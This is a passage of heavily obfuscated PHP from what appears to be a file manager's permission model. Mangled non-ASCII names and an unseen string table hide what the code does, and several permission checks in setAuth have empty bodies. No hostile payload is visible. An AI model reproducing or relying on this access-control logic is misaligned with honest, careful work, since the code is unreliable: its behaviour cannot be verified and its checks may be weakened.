(isset($½ûóÍÑ[$ƒ…¬ÂÁå])) { $ çÍ¹ùĞ[$ƒ…¬ÂÁå] = $½ûóÍÑ[$ƒ…¬ÂÁå]; } } if (count($ çÍ¹ùĞ) == count($‘ò†‹¹ˆ)) { return $ş°á©ùË ? $ çÍ¹ùĞ[$‘ò†‹¹ˆ[0]] : $ çÍ¹ùĞ; } $³Ÿ¢˜ö¯ = $Á¦êÖ¨Ç[1996]; $ãÏ©õçÓ = array($Á¦êÖ¨Ç[411] => array($Á¦êÖ¨Ç[7], $‘ò†‹¹ˆ)); $™ñ¤éÂ“ = $this->field($³Ÿ¢˜ö¯)->order($Á¦êÖ¨Ç[407])->where($ãÏ©õçÓ)->select(); $ã«ç²Ó£ = array_to_keyvalue_group($™ñ¤éÂ“, $Á¦êÖ¨Ç[411]); foreach ($‘ò†‹¹ˆ as $ƒ…¬ÂÁå) { $½ûóÍÑ[$ƒ…¬ÂÁå] = $ã«ç²Ó£[$ƒ…¬ÂÁå] ? $ã«ç²Ó£[$ƒ…¬ÂÁå] : array(); } if ($ş°á©ùË) { return $™ñ¤éÂ“; } return $ã«ç²Ó£; } public function setAuth($Ÿ‹‡á, $í÷Õî²) { $â•ÌÅˆ¯ =& $_SERVER[ĞÆÏ¡Îª]; $»´¥„†É = Model($â•ÌÅˆ¯[1318])->sourceInfo($Ÿ‹‡á); if (!$»´¥„†É) { return !1; } if ($»´¥„†É[$â•ÌÅˆ¯[420]] != SourceModel::TYPE_GROUP) { return !1; } $¾Æª›ÊÒ = 1; $­¼Ÿßî = $»´¥„†É[$â•ÌÅˆ¯[514]]; if ($­¼Ÿßî != $¾Æª›ÊÒ) { $¨ìáÕÚî = array($â•ÌÅˆ¯[1819] => $­¼Ÿßî); $Íé—ã¸ = Model($â•ÌÅˆ¯[1909])->field($â•ÌÅˆ¯[1647])->where($¨ìáÕÚî)->select(); $Íé—ã¸ = array_to_keyvalue($Íé—ã¸, $â•ÌÅˆ¯[12], $â•ÌÅˆ¯[1647]); } $Œ¥®©Â² = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $À§ıŸ‹Æ = array(); foreach ($í÷Õî² as $ËôŠæë) { if (!in_array($ËôŠæë[$â•ÌÅˆ¯[420]], $Œ¥®©Â²)) { show_json(LNG($â•ÌÅˆ¯[1997]), !1); } if ($­¼Ÿßî != $¾Æª›ÊÒ) { if ($ËôŠæë[$â•ÌÅˆ¯[420]] == SourceModel::TYPE_GROUP) { } if ($ËôŠæë[$â•ÌÅˆ¯[514]] != 0 && !in_array($ËôŠæë[$â•ÌÅˆ¯[514]], $Íé—ã¸)) { } } if ($ËôŠæë[$â•ÌÅˆ¯[514]] == 0) { $ËôŠæë[$â•ÌÅˆ¯[420]] = SourceModel::TYPE_USER; } $À§ıŸ‹Æ[] = array($â•ÌÅˆ¯[411] => $Ÿ‹‡á, $â•ÌÅˆ¯[420] => intval($ËôŠæë[$â•ÌÅˆ¯[420]]), $â•ÌÅˆ¯[514] => intval($ËôŠæë[$â•ÌÅˆ¯[514]]), $â•ÌÅˆ¯[1923] => intval($ËôŠæë[$â•ÌÅˆ¯[1923]]) ? intval($ËôŠæë[$â•ÌÅˆ¯[1923]]) : 0, $â•ÌÅˆ¯[1979] => intval($ËôŠæë[$â•ÌÅˆ¯[1979]]) ? intval($ËôŠæë[$â•ÌÅˆ¯[1979]]) : -1); } $this->where(array($â•ÌÅˆ¯[426] => $Ÿ‹‡á))->delete(); $this->addAll($À§ıŸ‹Æ); return !0; } public function authClear($ÈæÉ¾üì) { $§´¢¯Ğ˜ =& $_SERVER[ĞÆÏ¡Îª]; $¥˜°®Ø = Model($§´¢¯Ğ˜[1318])->sourceInfo($ÈæÉ¾üì); $‡™Û™Ìş = array($ÈæÉ¾üì); if ($¥˜°®Ø[$§´¢¯Ğ˜[419]] == $§´¢¯Ğ˜[88]) { $ëÒÌÌœ = array($§´¢¯Ğ˜[599] => array($§´¢¯Ğ˜[559], $¥˜°®Ø[$§´¢¯Ğ˜[530]] . $ÈæÉ¾üì . $§´¢¯Ğ˜[560])); $‡™Û™Ìş = Model($§´¢¯Ğ˜[1318])->field($§´¢¯Ğ˜[426])->where($ëÒÌÌœ)->getField($§´¢¯Ğ˜[411], !0); $‡™Û™Ìş[] = $ÈæÉ¾üì; } $this->where(array($§´¢¯Ğ˜[426] => array($§´¢¯Ğ˜[427], $‡™Û™Ìş)))->delete(); return !0; } public function getAllChildren($Û…º½Ÿ¢) { $ƒ¿ş°öÂ =& $_SERVER[ĞÆÏ¡Îª]; $íÎ‚ã† = Model($ƒ¿ş°öÂ[1318])->sourceInfo($Û…º½Ÿ¢); if ($íÎ‚ã†[$ƒ¿ş°öÂ[419]] != $ƒ¿ş°öÂ[88]) { return $this->sourceListAuth(array($Û…º½Ÿ¢)); } if ($íÎ‚ã†[$ƒ¿ş°öÂ[420]] != SourceModel::TYPE_GROUP) { return array(); } $ÆÁæ²ª© = 1; $÷È¢Å× = array($Û…º½Ÿ¢); if ($íÎ‚ã†[$ƒ¿ş°öÂ[441]] == $ƒ¿ş°öÂ[197] && $íÎ‚ã†[$ƒ¿ş°öÂ[514]] != $ÆÁæ²ª©) { $÷È¢Å× = $this->groupChidldAllRootSource($íÎ‚ã†[$ƒ¿ş°öÂ[514]]); } $µ´ã®È = $this->field($ƒ¿ş°öÂ[411])->group($ƒ¿ş°öÂ[411])->select(); $µ´ã®È = array_to_keyvalue($µ´ã®È, $ƒ¿ş°öÂ[12], $ƒ¿ş°öÂ[411]); if (!$µ´ã®È) { return array(); } $çíôÈú§ = $ƒ¿ş°öÂ[1998]; $€ŸœÁÅÙ = array($ƒ¿ş°öÂ[411] => array($ƒ¿ş°öÂ[7], $µ´ã®È), $ƒ¿ş°öÂ[440] => $ƒ¿ş°öÂ[197]); $Øš³°©ä = Model($ƒ¿ş°öÂ[820])->field($çíôÈú§)->where($€ŸœÁÅÙ)->select(); $íÁÕë¼ã = array($Û…º½Ÿ¢); foreach ($Øš³°©ä as $¹ŠƒìÓé) { foreach ($÷È¢Å× as $£¾ˆº›û) { $‹ã‘ü˜â = $ƒ¿ş°öÂ[50] . $£¾ˆº›û . $ƒ¿ş°öÂ[50]; $´Ö®÷Ï = $¹ŠƒìÓé[$ƒ¿ş°öÂ[530]] . $¹ŠƒìÓé[$ƒ¿ş°öÂ[411]] . $ƒ¿ş°öÂ[50]; if (strstr($´Ö®÷Ï, $‹ã‘ü˜â)) { $íÁÕë¼ã[] = $¹ŠƒìÓé[$ƒ¿ş°öÂ[411]]; break; } } } return $this->sourceListAuth($íÁÕë¼ã); } private function sourceListAuth($Ëñ›¹‹ó) { $µøì€À¨ =& $_SERVER[ĞÆÏ¡Îª]; $ı”Ö´°Å = Model($µøì€À¨[1318])->sourceListInfo($Ëñ›¹‹ó, !0); $¶ÇÁ˜‡‰ = $this->sourceAuthSelect($Ëñ›¹‹ó); $Çô«Ü¨ê = array(); $ÅîãüÑ» = array(); foreach ($ı”Ö´°Å as $êí¹¦Ô¾) { unset($êí¹¦Ô¾[$µøì€À¨[465]]); unset($êí¹¦Ô¾[$µøì€À¨[463]]); unset($êí¹¦Ô¾[$µøì€À¨[422]]); unset($êí¹¦Ô¾[$µøì€À¨[86]]); $ÅøòŞğĞ = $¶ÇÁ˜‡‰[$êí¹¦Ô¾[$µøì€À¨[411]]]; if (!$ÅøòŞğĞ) { continue; } $êí¹¦Ô¾[$µøì€À¨[1999]] = $this->authTargetInfo($ÅøòŞğĞ); $êí¹¦Ô¾[$µøì€À¨[528]] = rtrim($êí¹¦Ô¾[$µøì€À¨[534]], $µøì€À¨[8]) . $µøì€À¨[8] . ltrim($êí¹¦Ô¾[$µøì€À¨[528]], $µøì€À¨[8]); $Çô«Ü¨ê[] = $êí¹¦Ô¾; $ò®“ïï¡ = count(explode($µøì€À¨[8], trim($êí¹¦Ô¾[$µøì€À¨[528]], $µøì€À¨[8]))); $ÅîãüÑ»[] = $ò®“ïï¡ + ($êí¹¦Ô¾[$µøì€À¨[33]] == $µøì€À¨[75] ? 0 : 1000); } array_multisort($ÅîãüÑ», SORT_ASC, $Çô«Ü¨ê); return $Çô«Ü¨ê; } private function groupChidldAllRootSource($µ€øêÂ) { $½¶ïÁãÔ =& $_SERVER[ĞÆÏ¡Îª]; $ûœ×Ã³ë = Model($½¶ïÁãÔ[2000])->groupChildrenAll($µ€øêÂ); $ˆÒ÷Æ‚´ = array($½¶ïÁãÔ[441] => 0, $½¶ïÁãÔ[514] => array($½¶ïÁãÔ[7], $ûœ×Ã³ë), $½¶ïÁãÔ[420] => SourceModel::TYPE_GROUP); $‘çõšäë = Model($½¶ïÁãÔ[820])->field($½¶ïÁãÔ[411])->where($ˆÒ÷Æ‚´)->select(); $‘çõšäë = array_to_keyvalue($‘çõšäë, $½¶ïÁãÔ[12], $½¶ïÁãÔ[411]); return $‘çõšäë; } private function authTargetInfo($úˆş–´ë) { $éç¿¸‡± =& $_SERVER[ĞÆÏ¡Îª]; $é“¶½‘¸ = array(); $Íîèó¸’ = array(); $æ‹ÆÏ²— = 2 << 25; foreach ($úˆş–´ë as $û‡Ë–Îæ) { $íÒ®Ôìé = Model($éç¿¸‡±[516])->listData($û‡Ë–Îæ[$éç¿¸‡±[1923]]); if (!$íÒ®Ôìé) { continue; } if ($û‡Ë–Îæ[$éç¿¸‡±[420]] == SourceModel::TYPE_USER) { $ï×ú˜·× = Model($éç¿¸‡±[522])->getInfoSimpleOuter($û‡Ë–Îæ[$éç¿¸‡±[514]]); if ($ï×ú˜·×[$éç¿¸‡±[1647]] == $éç¿¸‡±[1181]) { continue; } if ($ï×ú˜·×[$éç¿¸‡±[1647]] == $éç¿¸‡±[197]) { $ï×ú˜·×[$éç¿¸‡±[32]] = LNG($éç¿¸‡±[2001]); } } else { $ï×ú˜·× = Model($éç¿¸‡±[531])->getInfoSimple($û‡Ë–Îæ[$éç¿¸‡±[514]]); } if (!$ï×ú˜·×) { continue; } $ï×ú˜·×[$éç¿¸‡±[476]] = $íÒ®Ôìé; $é“¶½‘¸[] = $ï×ú˜·×; $êÑ‘ÄÈõ = 0; if ($û‡Ë–Îæ[$éç¿¸‡±[420]] == SourceModel::TYPE_GROUP) { $êÑ‘ÄÈõ = $æ‹ÆÏ²— * 2; } if ($û‡Ë–Îæ[$éç¿¸‡±[420]] == SourceModel::TYPE_USER) { $êÑ‘ÄÈõ = $æ‹ÆÏ²—; } if ($û‡Ë–Îæ[$éç¿¸‡±[420]] == SourceModel::TYPE_USER && $û‡Ë–Îæ[$éç¿¸‡±[514]] == $éç¿¸‡±[197]) { $êÑ‘ÄÈõ = 0; } $Íîèó¸’[] = $íÒ®Ôìé[$éç¿¸‡±[422]] + $êÑ‘ÄÈõ; } array_multisort($Íîèó¸’, SORT_DESC, $é“¶½‘¸); return $é“¶½‘¸; } public function getAllChildrenByUser($º›úÍŞÒ, $Üüò¸‚) { $ê£ÏÆ…è =& $_SERVER[ĞÆÏ¡Îª]; $Å¡èµ®Ğ = Model($ê£ÏÆ…è[544])->getInfo($Üüò¸‚); if (!$Üüò¸‚ || !$º›úÍŞÒ || !$Å¡èµ®Ğ) { return array(); } $°Ç×¬½Ä = Model($ê£ÏÆ…è[1318])->sourceInfo($º›úÍŞÒ); $¼˜µ®Ì = array(); $§×¯°ö‘ = 1; if ($°Ç×¬½Ä[$ê£ÏÆ…è[441]] == $ê£ÏÆ…è[197] && $°Ç×¬½Ä[$ê£ÏÆ…è[514]] != $§×¯°ö‘ && $this->groupContainUser($°Ç×¬½Ä[$ê£ÏÆ…è[514]], $Üüò¸‚)) { foreach ($Å¡èµ®Ğ[$ê£ÏÆ…è[2002]] as $öÆüŒ˜æ) { $¤á¤Å‰® = Model($ê£ÏÆ…è[531])->getInfo($öÆüŒ˜æ[$ê£ÏÆ…è[1819]]); $ÛÕÖÌƒ— = Model($ê£ÏÆ…è[544])->getInfoSimpleOuter($Üüò¸‚); $ÛÕÖÌƒ—[$ê£ÏÆ…è[476]] = $öÆüŒ˜æ[$ê£ÏÆ…è[422]]; if (Model($ê£ÏÆ…è[516])->authCheckAction($öÆüŒ˜æ[$ê£ÏÆ…è[422]][$ê£ÏÆ…è[422]], $ê£ÏÆ…è[1840])) { continue; } $°ªñ½¿Á = array($ê£ÏÆ…è[32] => $ê£ÏÆ…è[1595] . $¤á¤Å‰®[$ê£ÏÆ…è[32]], $ê£ÏÆ…è[411] => $¤á¤Å‰®[$ê£ÏÆ…è[86]][$ê£ÏÆ…è[411]], $ê£ÏÆ…è[84] => KodIO::make($¤á¤Å‰®[$ê£ÏÆ…è[86]][$ê£ÏÆ…è[411]]), $ê£ÏÆ…è[441] => $ê£ÏÆ…è[197], $ê£ÏÆ…è[420] => $ê£ÏÆ…è[524], $ê£ÏÆ…è[33] => $ê£ÏÆ…è[563], $ê£ÏÆ…è[528] => $¤á¤Å‰®[$ê£ÏÆ…è[535]], $ê£ÏÆ…è[1819] => $¤á¤Å‰®[$ê£ÏÆ…è[1819]], $ê£ÏÆ…è[532] => $¤á¤Å‰®[$ê£ÏÆ…è[441]], $ê£ÏÆ…è[1999] => array($ÛÕÖÌƒ—)); $¼˜µ®Ì[$°ªñ½¿Á[$ê£ÏÆ…è[411]]] = $°ªñ½¿Á; } } $á‰ÃèæÏ = array(); $§³­ûê = $this->getAllChildren($º›úÍŞÒ); foreach ($§³­ûê as $óãóä) { $­ş¾½ç´ = !1; foreach ($óãóä[$ê£ÏÆ…è[1999]] as $âïÕ½) { if ($âïÕ½[$ê£ÏÆ…è[1647]]) { if ($âïÕ½[$ê£ÏÆ…è[1647]] == $Üüò¸‚) { $­ş¾½ç´ = !0; break; } } if ($âïÕ½[$ê£ÏÆ…è[1819]]) { if ($this->groupContainUser($âïÕ½[$ê£ÏÆ…è[1819]], $Üüò¸‚)) { $­ş¾½ç´ = !0; break; } } } if ($­ş¾½ç´) { $á‰ÃèæÏ[] = $óãóä; } $ïóú´× = $óãóä[$ê£ÏÆ…è[411]]; if (isset($¼˜µ®Ì[$ïóú´×])) { $óãóä[$ê£ÏÆ…è[1999]][] = $¼˜µ®Ì[$ïóú´×][0]; $¼˜µ®Ì[$ïóú´×] = !1; } } $¼˜µ®Ì = array_filter(array_values($¼˜µ®Ì)); $á‰ÃèæÏ = array_merge($¼˜µ®Ì, $á‰ÃèæÏ); return $á‰ÃèæÏ; } public function setAllChildrenByUser($’·ğƒ’î, $ÈÛ¢©šœ, $Õè€‰­ì) { $©áüÃ¨ˆ =& $_SERVER[ĞÆÏ¡Îª]; $ˆË”§ŞÔ = $this->getAllChildrenByUser($’·ğƒ’î, $ÈÛ¢©šœ); if (!$Õè€‰­ì || !$ˆË”§ŞÔ) { return !1; } foreach ($ˆË”§ŞÔ as $ú¾óæµ) { $Ş…‚¬Ó = array(); foreach ($ú¾óæµ[$©áüÃ¨ˆ[1999]] as $ƒêÙª—ö) { $İ¨ÂÀã÷ = $ƒêÙª—ö[$©áüÃ¨ˆ[476]]; $‘”Ø¡™Ã = $ƒêÙª—ö[$©áüÃ¨ˆ[1647]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $™Ã¾ĞÚÕ = $ƒêÙª—ö[$©áüÃ¨ˆ[1647]] ? $ƒêÙª—ö[$©áüÃ¨ˆ[1647]] : $ƒêÙª—ö[$©áüÃ¨ˆ[1819]]; if ($ƒêÙª—ö[$©áüÃ¨ˆ[1647]] && $ƒêÙª—ö[$©áüÃ¨ˆ[1647]] == $ÈÛ¢©šœ) { continue; } $Ş…‚¬Ó[] = array($©áüÃ¨ˆ[411] => $ú¾óæµ[$©áüÃ¨ˆ[411]], $©áüÃ¨ˆ[420] => $‘”Ø¡™Ã, $©áüÃ¨ˆ[514] => intval($™Ã¾ĞÚÕ), $©áüÃ¨ˆ[1923] => isset($İ¨ÂÀã÷[$©áüÃ¨ˆ[407]]) ? intval($İ¨ÂÀã÷[$©áüÃ¨ˆ[407]]) : 0, $©áüÃ¨ˆ[1979] => isset($İ¨ÂÀã÷[$©áüÃ¨ˆ[1979]]) ? intval($İ¨ÂÀã÷[$©áüÃ¨ˆ[1979]]) : -1); } $Ş…‚¬Ó[] = array($©áüÃ¨ˆ[411] => $ú¾óæµ[$©áüÃ¨ˆ[411]], $©áüÃ¨ˆ[420] => SourceModel::TYPE_USER, $©áüÃ¨ˆ[514] => intval($ÈÛ¢©šœ), $©áüÃ¨ˆ[1923] => intval($Õè€‰­ì), $©áüÃ¨ˆ[1979] => -1); $this->where(array($©áüÃ¨ˆ[426] => $ú¾óæµ[$©áüÃ¨ˆ[411]]))->delete(); $this->addAll($Ş…‚¬Ó); } return !0; } public function get($à£ø†¤) { $…×³ï’µ = $this->getSourceList(array($à£ø†¤), !0); return $…×³ï’µ[0]; } public function getSourceList($ÏªÀ‡„…, $ä¦ª³ôƒ = false, $§ª½Ó×¸ = false) { $è¸ÏÄ·— =& $_SERVER[ĞÆÏ¡Îª]; if (!$ÏªÀ‡„…) { return array(); } $Ôç´¦êÃ = Model($è¸ÏÄ·—[1318]); if (!$ä¦ª³ôƒ && count($ÏªÀ‡„…) == 1) { $ä¦ª³ôƒ = array(); $ä¦ª³ôƒ[$ÏªÀ‡„…[0]] = $Ôç´¦êÃ->sourceInfo($ÏªÀ‡„…[0]); } if (!$ä¦ª³ôƒ) { $šÔ€ğ×— = array($è¸ÏÄ·—[426] => array($è¸ÏÄ·—[427], $ÏªÀ‡„…)); $ä¦ª³ôƒ = $Ôç´¦êÃ->field($è¸ÏÄ·—[2003])->where($šÔ€ğ×—)->select(); $ä¦ª³ôƒ = array_to_keyvalue($ä¦ª³ôƒ, $è¸ÏÄ·—[411]); } $»–ù‘ï‚ = $ÏªÀ‡„…; foreach ($ä¦ª³ôƒ as $Ÿ‡ó¾à => $»Èù¹˜Ü) { $­²ÏœÃÅ = $Ôç´¦êÃ->parentLevelArray($»Èù¹˜Ü[$è¸ÏÄ·—[530]]); $»–ù‘ï‚ = array_merge($»–ù‘ï‚, array($Ÿ‡ó¾à), array_reverse($­²ÏœÃÅ)); } $»–ù‘ï‚ = array_values(array_unique($»–ù‘ï‚)); if (!$»–ù‘ï‚) { return array(); } $•·ï©¥ = $this->sourceAuthSelect($»–ù‘ï‚); $ò´Øß©› = array(); foreach ($»–ù‘ï‚ as $†ó —ö) { if (isset($•·ï©¥[$†ó —ö])) { $ò´Øß©›[$†ó —ö] = $•·ï©¥[$†ó —ö]; } } $íÀîşŒì = $this->userIsRoot($§ª½Ó×¸); $¹’Şİº® = AuthModel::authAll(); $Ó¹—Ôú· = array($è¸ÏÄ·—[423] => $¹’Şİº®, $è¸ÏÄ·—[2004] => array($è¸ÏÄ·—[428] => 0, $è¸ÏÄ·—[1825] => $¹’Şİº®, $è¸ÏÄ·—[429] => LNG($è¸ÏÄ·—[2005]), $è¸ÏÄ·—[1842] => $è¸ÏÄ·—[2006])); $âÂõÈ¿ = array(); foreach ($ä¦ª³ôƒ as $†ó —ö => $ØØëÙÔ×) { if ($íÀîşŒì && $GLOBALS[$è¸ÏÄ·—[6]][$è¸ÏÄ·—[1838]]) { $âÂõÈ¿[$†ó —ö] = $Ó¹—Ôú·; continue; } $âÂõÈ¿[$†ó —ö] = $this->makeSourceAuth($ØØëÙÔ×, $ò´Øß©›, $§ª½Ó×¸); } return $âÂõÈ¿; } public function authDeepCheck($•¦èö›Î, $¢ šÁ®® = false) { $ä¢äÌÕ =& $_SERVER[ĞÆÏ¡Îª]; $¢ šÁ®® = $¢ šÁ®® ? $¢ šÁ®® : USER_ID; $«Ü·À’ = $this->makeAuthDeep($¢ šÁ®®); if (!in_array($•¦èö›Î, $«Ü·À’[$ä¢äÌÕ[2007]])) { return !1; } $°ÈÍÊ† = array(); foreach ($«Ü·À’[$ä¢äÌÕ[2008]] as $é¼ğÀ¸÷ => $æ½‘¦ˆŒ) { if (!in_array($•¦èö›Î, $æ½‘¦ˆŒ)) { continue; } $°ÈÍÊ†[] = $é¼ğÀ¸÷; } if (!$°ÈÍÊ†) { return !1; } $¢ç‰ıø = $°ÈÍÊ† ? $°ÈÍÊ†[0] : $•¦èö›Î; return array($ä¢äÌÕ[423] => -1, $ä¢äÌÕ[476] => array($ä¢äÌÕ[428] => $ä¢äÌÕ[1181], $ä¢äÌÕ[1825] => $ä¢äÌÕ[197], $ä¢äÌÕ[429] => LNG($ä¢äÌÕ[2009]), $ä¢äÌÕ[1842] => $ä¢äÌÕ[2010]), $ä¢äÌÕ[2011] => LNG($ä¢äÌÕ[2012]), $ä¢äÌÕ[2013] => $this->sourceAuthInfo($¢ç‰ıø)); } protected function makeAuthDeep($”•ãÌë = false) { $ğ©®Çæ‹ =& $_SERVER[ĞÆÏ¡Îª]; static $éÛ«ˆ = array(); $”•ãÌë = $”•ãÌë ? $”•ãÌë : USER_ID; if (isset($éÛ«ˆ[$”•ãÌë])) { return $éÛ«ˆ[$”•ãÌë]; } $ïÈ¯Ø¯ì = Model($ğ©®Çæ‹[2014])->listData(); $‰õÉáÂê = array(); foreach ($ïÈ¯Ø¯ì as $ß¨¨·¨) { if ($ß¨¨·¨[$ğ©®Çæ‹[422]] == 0 && $ß¨¨·¨[$ğ©®Çæ‹[1841]] == $ğ©®Çæ‹[88]) { $‰õÉáÂê[] = $ß¨¨·¨[$ğ©®Çæ‹[407]]; } } $•õ’£Ââ = $this->userGroupParents($”•ãÌë); $¤Îôõã = array($ğ©®Çæ‹[420] => SourceModel::TYPE_USER, $ğ©®Çæ‹[514] => $”•ãÌë); if ($•õ’£Ââ) { $¤Îôõã = array(array($ğ©®Çæ‹[420] => SourceModel::TYPE_USER, $ğ©®Çæ‹[514] => $”•ãÌë), array($ğ©®Çæ‹[420] => SourceModel::TYPE_GROUP, $ğ©®Çæ‹[514] => array($ğ©®Çæ‹[427], $•õ’£Ââ)), $ğ©®Çæ‹[991] => $ğ©®Çæ‹[1917]); } $ßô®ƒÙ‹ = $this->field($ğ©®Çæ‹[2015])->where($¤Îôõã)->select(); $ØéÒÆâ½ = array(); $İÆ­äÓœ = array_to_keyvalue_group($ßô®ƒÙ‹, $ğ©®Çæ‹[411]); foreach ($İÆ­äÓœ as $ù³‰¾½– => $ÄÁğ×ëƒ) { $´Î›Ãš¡ = $this->authArrayCheck($ÄÁğ×ëƒ, $”•ãÌë); if ($´Î›Ãš¡[$ğ©®Çæ‹[423]] > 0) { $ØéÒÆâ½[] = $ù³‰¾½– . $ğ©®Çæ‹[12]; } } if ($•õ’£Ââ) { $ã˜é¥ê = Model($ğ©®Çæ‹[531]); foreach ($•õ’£Ââ as $”°È’±) { $òÏˆÇ• = $ã˜é¥ê->getInfo($”°È’±); if (!$òÏˆÇ• || !is_array($òÏˆÇ•[$ğ©®Çæ‹[86]])) { continue; } $ØéÒÆâ½[] = $òÏˆÇ•[$ğ©®Çæ‹[86]][$ğ©®Çæ‹[411]]; } } $´´ïû½ª = array(); $ŠÀû²á = $•õ’£Ââ; $Í“©ŸÄ§ = Model($ğ©®Çæ‹[1318]); $ã˜é¥ê = Model($ğ©®Çæ‹[531]); $§¥—¿¼÷ = array(); $ ê¥Ñæ = array(); $³ŠÌİÊ‹ = array(); $ÍÔ…É™ = array(); if ($ØéÒÆâ½) { $îŞ†ø´ = $Í“©ŸÄ§->where(array($ğ©®Çæ‹[411] => array($ğ©®Çæ‹[427], $ØéÒÆâ½)))->select(); foreach ($îŞ†ø´ as $ç©Ù¿’) { $óƒâ‘è = $Í“©ŸÄ§->parentLevelArray($ç©Ù¿’[$ğ©®Çæ‹[530]]); $´´ïû½ª = array_merge($´´ïû½ª, $óƒâ‘è); $ŠÀû²á[] = $ç©Ù¿’[$ğ©®Çæ‹[514]]; $§¥—¿¼÷[$ç©Ù¿’[$ğ©®Çæ‹[411]]] = $óƒâ‘è; $ ê¥Ñæ[$ç©Ù¿’[$ğ©®Çæ‹[411]]] = $ç©Ù¿’[$ğ©®Çæ‹[514]]; } } $ŠÀû²á = array_values(array_unique($ŠÀû²á)); $ßûü‡« = $ŠÀû²á; foreach ($ßûü‡« as $”°È’±) { $òÏˆÇ• = $ã˜é¥ê->getInfo($”°È’±); $óƒâ‘è = $Í“©ŸÄ§->parentLevelArray($òÏˆÇ•[$ğ©®Çæ‹[530]]); $ŠÀû²á = array_merge($ŠÀû²á, $óƒâ‘è); } $ŠÀû²á = array_values(array_unique($ŠÀû²á)); foreach ($ŠÀû²á as $”°È’±) { $òÏˆÇ• = $ã˜é¥ê->getInfo($”°È’±); $´´ïû½ª[] = $òÏˆÇ•[$ğ©®Çæ‹[86]][$ğ©®Çæ‹[411]]; $³ŠÌİÊ‹[$”°È’±] = $òÏˆÇ•[$ğ©®Çæ‹[86]][$ğ©®Çæ‹[411]]; $ÍÔ…É™[$”°È’±] = $Í“©ŸÄ§->parentLevelArray($òÏˆÇ•[$ğ©®Çæ‹[530]]); } foreach ($§¥—¿¼÷ as $ôåÜ†ôÑ => $öİÇ¢Î) { $ïû®ĞûÓ = $ ê¥Ñæ[$ôåÜ†ôÑ]; if (!$ïû®ĞûÓ || !$³ŠÌİÊ‹[$ïû®ĞûÓ]) { continue; } $ÉÆÊ±Î˜ = array(); foreach ($ÍÔ…É™[$ïû®ĞûÓ] as $”°È’±) { $ÉÆÊ±Î˜[] = $³ŠÌİÊ‹[$”°È’±]; } $§¥—¿¼÷[$ôåÜ†ôÑ] = array_merge($ÉÆÊ±Î˜, $öİÇ¢Î); } $´´ïû½ª = array_values(array_unique($´´ïû½ª)); $ˆ„®´Ğà = array($ğ©®Çæ‹[2007] => $´´ïû½ª, $ğ©®Çæ‹[2008] => $§¥—¿¼÷); $éÛ«ˆ[$”•ãÌë] = $ˆ„®´Ğà; return $ˆ„®´Ğà; } private function makeSourceAuth($Øâ®Ä­Ÿ, $ÄÓç´ÖÁ, $Ï¼Ù‘ßæ = false) { $ÌÓõó´û =& $_SERVER[ĞÆÏ¡Îª]; $…Æˆ‘ = $ÌÓõó´û[88]; $«Ïõıìì = $Øâ®Ä­Ÿ[$ÌÓõó´û[514]]; $½Şá˜ÄË = $Øâ®Ä­Ÿ[$ÌÓõó´û[420]] == SourceModel::TYPE_GROUP; $ìĞ¢êú£ = $½Şá˜ÄË ? $this->groupRootAuth($«Ïõıìì, $Ï¼Ù‘ßæ) : !1; if ($ìĞ¢êú£ && Model($ÌÓõó´û[516])->authCheckAction($ìĞ¢êú£[$ÌÓõó´û[422]], $ÌÓõó´û[1840])) { return $this->groupAuthInfo($ìĞ¢êú£, $«Ïõıìì); } $¼í¹ä¡ß = Model($ÌÓõó´û[1318])->parentLevelArray($Øâ®Ä­Ÿ[$ÌÓõó´û[530]]); $¼í¹ä¡ß = array_merge(array($Øâ®Ä­Ÿ[$ÌÓõó´û[411]]), array_reverse($¼í¹ä¡ß)); $š¢—œ°Œ = !1; foreach ($¼í¹ä¡ß as $¡úŞšñŞ) { if (!isset($ÄÓç´ÖÁ[$¡úŞšñŞ])) { continue; } $ÕçÑ‚© = $this->authMake($ÄÓç´ÖÁ[$¡úŞšñŞ], $Ï¼Ù‘ßæ); if ($ÕçÑ‚©[$ÌÓõó´û[476]]) { $š¢—œ°Œ = $ÕçÑ‚©; break; } } if (!$½Şá˜ÄË) { return $š¢—œ°Œ; } if (!$š¢—œ°Œ && $ìĞ¢êú£) { $š¢—œ°Œ = $this->groupAuthInfo($ìĞ¢êú£, $«Ïõıìì); } if (!$š¢—œ°Œ) { $âÛ‰„ô = Model($ÌÓõó´û[531])->getInfo($«Ïõıìì); $¡¬¸Ëº‰ = explode($ÌÓõó´û[50], trim($âÛ‰„ô[$ÌÓõó´û[530]], $ÌÓõó´û[50])); $¡¬¸Ëº‰ = array_reverse($¡¬¸Ëº‰); foreach ($¡¬¸Ëº‰ as $´÷ÇœÑ) { if ($´÷ÇœÑ == $ÌÓõó´û[197] || $´÷ÇœÑ == $…Æˆ‘) { continue; } $Íİúñ‹¼ = $this->groupRootAuth($´÷ÇœÑ, $Ï¼Ù‘ßæ); if (!$Íİúñ‹¼) { continue; } $š¢—œ°Œ = $this->groupAuthInfo($Íİúñ‹¼, $´÷ÇœÑ); break; } } if (!$š¢—œ°Œ || $š¢—œ°Œ[$ÌÓõó´û[423]] <= 0) { $Øµ¾Ñşî = $this->authDeepCheck($Øâ®Ä­Ÿ[$ÌÓõó´û[411]], $Ï¼Ù‘ßæ); if ($Øµ¾Ñşî) { $š¢—œ°Œ = $Øµ¾Ñşî; } } return $š¢—œ°Œ; } private function userIsRoot($¨ô§ù–ô = false) { $É ´ùæÔ =& $_SERVER[ĞÆÏ¡Îª]; if (!$¨ô§ù–ô && _get($GLOBALS, $É ´ùæÔ[512])) { return !0; } $ãÆ ¨ˆ– = Model($É ´ùæÔ[544])->getInfo($¨ô§ù–ô); $şıƒÖáè = Model($É ´ùæÔ[2016])->listData($ãÆ ¨ˆ–[$É ´ùæÔ[1526]]); if ($şıƒÖáè && $şıƒÖáè[$É ´ùæÔ[520]][$É ´ùæÔ[2017]] == 1) { return !0; } return !1; } private function sourceAuthInfo($–º“´»ô) { $‚İßàÓ© =& $_SERVER[ĞÆÏ¡Îª]; $¸ï…ÈÎŠ = Model($‚İßàÓ©[1318]); $ñ´±¬ã¯ = $¸ï…ÈÎŠ->sourceInfo($–º“´»ô); if (!$ñ´±¬ã¯) { return !1; } $¸ï…ÈÎŠ->groupPathDisplay($ñ´±¬ã¯); $œ‡Ñó™à = array($ñ´±¬ã¯); $œ‡Ñó™à = $¸ï…ÈÎŠ->_listAppendPath($œ‡Ñó™à); $ñ´±¬ã¯ = $œ‡Ñó™à[0]; $¿®†ÄÀı = $ñ´±¬ã¯[$‚İßàÓ©[528]]; if 